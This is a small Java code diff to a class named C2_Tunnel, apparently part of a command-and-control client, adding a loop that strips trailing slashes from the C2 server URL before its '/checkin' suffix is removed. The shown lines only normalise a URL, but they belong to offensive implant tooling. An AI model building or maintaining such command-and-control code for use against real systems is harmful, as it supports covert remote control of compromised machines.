@@ -36,6 +36,9 @@ public class C2_Tunnel {
         if (c2Url.contains("script.google.com") || c2Url.contains("script.googleusercontent.com")) return;
 
         String baseC2 = c2Url.trim();
+        while (baseC2.endsWith("/")) {
+            baseC2 = baseC2.substring(0, baseC2.length() - 1);
+        }
         if (baseC2.endsWith("/checkin")) {
             baseC2 = baseC2.substring(0, baseC2.length() - 8);
         }
